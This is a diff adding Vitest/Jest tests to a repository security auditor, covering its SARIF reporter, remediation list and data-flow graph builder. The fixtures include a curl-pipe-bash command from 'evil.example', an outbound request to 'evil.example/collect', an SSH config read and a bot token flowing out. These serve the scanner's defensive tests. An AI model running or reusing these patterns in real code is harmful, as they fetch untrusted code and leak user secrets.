@@ -6,7 +6,9 @@ import {
   renderDecisionRecord,
   renderJsonReport,
   renderMarkdownReport,
-  renderMermaidDataFlow
+  renderMermaidDataFlow,
+  renderRemediationList,
+  renderSarifReport
 } from "../src/reporters.js";
 import { assessRisk } from "../src/risk.js";
 import { runRules } from "../src/rules.js";
@@ -48,11 +50,122 @@ describe("reporters", () => {
     expect(JSON.parse(renderDecisionRecord(report))).toEqual(
       expect.objectContaining({
         decision: "Block",
-        blockingFindings: expect.arrayContaining(risk.blockingFindingIds),
+        blockingFindingIds: expect.arrayContaining(risk.blockingFindingIds),
+        blockingFindings: expect.arrayContaining([
+          expect.objectContaining({
+            id: expect.any(String),
+            riskLevel: expect.any(String),
+            category: expect.any(String),
+            filePath: expect.any(String),
+            lineStart: expect.any(Number),
+            lineEnd: expect.any(Number),
+            codeSnippet: expect.any(String),
+            explanation: expect.any(String),
+            recommendedFix: expect.any(String),
+            evidenceTags: expect.any(Array),
+            confidence: expect.any(String)
+          })
+        ]),
         requiredFixes: expect.arrayContaining([expect.stringContaining("Avoid shell execution")])
       })
     );
     expect(renderMermaidDataFlow(dataFlow)).toContain("evil.example");
+  });
+
+  it("renders SARIF with finding rules, results, locations, and preserved evidence properties", () => {
+    const finding = makeFinding({
+      id: "finding-network",
+      riskLevel: "High",
+      category: "network",
+      filePath: "src/index.ts",
+      lineStart: 9,
+      lineEnd: 10,
+      evidenceTags: ["network-endpoint", "exfiltration-candidate"],
+      sink: "https://evil.example/collect"
+    });
+    const report = makeReport([finding], {
+      nodes: [],
+      edges: []
+    });
+
+    const sarif = JSON.parse(renderSarifReport(report));
+
+    expect(sarif.version).toBe("2.1.0");
+    expect(sarif.runs).toHaveLength(1);
+    expect(sarif.runs[0].tool.driver).toEqual(
+      expect.objectContaining({
+        name: "repository-security-auditor",
+        version: "0.1.0",
+        rules: expect.arrayContaining([
+          expect.objectContaining({
+            id: "network/finding-network",
+            properties: expect.objectContaining({
+              category: "network",
+              riskLevel: "High"
+            })
+          })
+        ])
+      })
+    );
+    expect(sarif.runs[0].results).toEqual([
+      expect.objectContaining({
+        ruleId: "network/finding-network",
+        level: "error",
+        message: { text: "network risk" },
+        locations: [
+          {
+            physicalLocation: {
+              artifactLocation: { uri: "src/index.ts" },
+              region: { startLine: 9, endLine: 10 }
+            }
+          }
+        ],
+        properties: expect.objectContaining({
+          riskLevel: "High",
+          category: "network",
+          confidence: "High",
+          evidenceTags: ["network-endpoint", "exfiltration-candidate"],
+          recommendedFix: "Review endpoint and payload.",
+          codeSnippet: 'https.request("https://evil.example/collect")'
+        })
+      })
+    ]);
+  });
+
+  it("renders a standalone remediation list with decision requirements", () => {
+    const blockingFinding = makeFinding({
+      id: "finding-blocking",
+      riskLevel: "Critical",
+      recommendedFix: "Remove unsafe command execution."
+    });
+    const nonBlockingFinding = makeFinding({
+      id: "finding-monitor",
+      riskLevel: "Low",
+      recommendedFix: "Document expected telemetry endpoint."
+    });
+    const report = makeReport([blockingFinding, nonBlockingFinding], { nodes: [], edges: [] });
+    report.risk.blockingFindingIds = ["finding-blocking"];
+
+    expect(JSON.parse(renderRemediationList(report))).toEqual([
+      {
+        id: "finding-blocking",
+        riskLevel: "Critical",
+        filePath: "src/index.ts",
+        lineStart: 1,
+        explanation: "network risk",
+        recommendedFix: "Remove unsafe command execution.",
+        decisionRequired: true
+      },
+      {
+        id: "finding-monitor",
+        riskLevel: "Low",
+        filePath: "src/index.ts",
+        lineStart: 1,
+        explanation: "network risk",
+        recommendedFix: "Document expected telemetry endpoint.",
+        decisionRequired: false
+      }
+    ]);
   });
 
   it("connects filesystem-sensitive sources to external destinations", async () => {
@@ -74,6 +187,118 @@ describe("reporters", () => {
         to: externalNode?.id,
         label: "possible outbound flow"
       })
+    );
+  });
+
+  it("adds API nodes and leaves-machine destinations for outbound and local data flows", () => {
+    const findings = [
+      makeFinding({
+        id: "finding-network",
+        category: "network",
+        filePath: "src/index.ts",
+        lineStart: 9,
+        sink: "https://evil.example/collect",
+        evidenceTags: ["network-endpoint", "exfiltration-candidate"]
+      }),
+      makeFinding({
+        id: "finding-command",
+        category: "command-injection",
+        filePath: "src/index.ts",
+        lineStart: 13,
+        codeSnippet: "exec(`curl https://evil.example/install.sh | bash`)",
+        evidenceTags: ["command-execution"]
+      }),
+      makeFinding({
+        id: "finding-db",
+        category: "persistence",
+        filePath: "src/db.ts",
+        lineStart: 4,
+        codeSnippet: "await prisma.user.create({ data })",
+        evidenceTags: ["persistence", "database"]
+      }),
+      makeFinding({
+        id: "finding-fs-write",
+        category: "filesystem",
+        filePath: "src/cache.ts",
+        lineStart: 3,
+        codeSnippet: 'writeFileSync("cache.json", JSON.stringify(data))',
+        evidenceTags: ["filesystem-write"]
+      })
+    ];
+    const dataFlow = buildDataFlowGraph(
+      {
+        files: [],
+        packageScripts: [],
+        dependencySources: [],
+        environmentVariables: ["TELEGRAM_BOT_TOKEN"],
+        networkEndpoints: [
+          {
+            endpoint: "https://evil.example/collect",
+            filePath: "src/index.ts",
+            line: 9,
+            snippet: 'https.request("https://evil.example/collect")'
+          }
+        ],
+        commandExecutions: [{ filePath: "src/index.ts", line: 13, snippet: "exec(`curl https://evil.example/install.sh | bash`)" }],
+        filesystemReads: [{ filePath: "src/index.ts", line: 7, snippet: "readFileSync(`${process.env.HOME}/.ssh/config`)" }],
+        githubWorkflowFiles: [".github/workflows/ci.yml"],
+        electronIpcFiles: ["src/main.ts"],
+        persistenceIndicators: [{ filePath: "src/db.ts", line: 4, snippet: "await prisma.user.create({ data })" }]
+      },
+      findings
+    );
+
+    expect(dataFlow.nodes).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({ id: "network api:src/index.ts:9", kind: "process", leavesMachine: false }),
+        expect.objectContaining({ id: "command api:src/index.ts:13", kind: "process", leavesMachine: false }),
+        expect.objectContaining({ id: "filesystem api:src/cache.ts:3", kind: "process", leavesMachine: false }),
+        expect.objectContaining({ id: "persistence api:src/db.ts:4", kind: "process", leavesMachine: false }),
+        expect.objectContaining({ id: "github-actions api:.github/workflows/ci.yml:1", kind: "process", leavesMachine: false }),
+        expect.objectContaining({ id: "electron-ipc api:src/main.ts:1", kind: "process", leavesMachine: false }),
+        expect.objectContaining({
+          id: "external:https://evil.example/collect",
+          kind: "external-destination",
+          leavesMachine: true
+        }),
+        expect.objectContaining({
+          id: "local:persistence:src/db.ts:4",
+          kind: "local-sink",
+          leavesMachine: false
+        }),
+        expect.objectContaining({
+          id: "local:filesystem:src/cache.ts:3",
+          kind: "local-sink",
+          leavesMachine: false
+        })
+      ])
+    );
+    expect(dataFlow.edges).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          from: "env:TELEGRAM_BOT_TOKEN",
+          to: "network api:src/index.ts:9",
+          label: "possible sensitive input"
+        }),
+        expect.objectContaining({
+          from: "network api:src/index.ts:9",
+          to: "external:https://evil.example/collect",
+          label: "outbound external call",
+          findingIds: ["finding-network"]
+        }),
+        expect.objectContaining({
+          from: "persistence api:src/db.ts:4",
+          to: "local:persistence:src/db.ts:4",
+          label: "local persistence sink",
+          findingIds: ["finding-db"]
+        }),
+        expect.objectContaining({
+          from: "filesystem api:src/cache.ts:3",
+          to: "local:filesystem:src/cache.ts:3",
+          label: "local filesystem sink",
+          findingIds: ["finding-fs-write"]
+        })
+      ])
     );
   });
 
@@ -156,5 +381,23 @@ function makeFinding(overrides: Partial<Finding> = {}): Finding {
     evidenceTags: ["network-endpoint"],
     confidence: "High",
     ...overrides
+  };
+}
+
+function makeReport(findings: Finding[], dataFlow: DataFlowGraph): AuditReport {
+  return {
+    target: {
+      type: "local-directory",
+      source: "/tmp/project",
+      localPath: "/tmp/project",
+      provenance: { source: "/tmp/project" },
+      networkUsed: false,
+      trustBoundary: "local"
+    },
+    findings,
+    dataFlow,
+    risk: assessRisk(findings),
+    generatedAt: "2026-06-14T00:00:00.000Z",
+    toolVersion: "0.1.0"
   };
 }
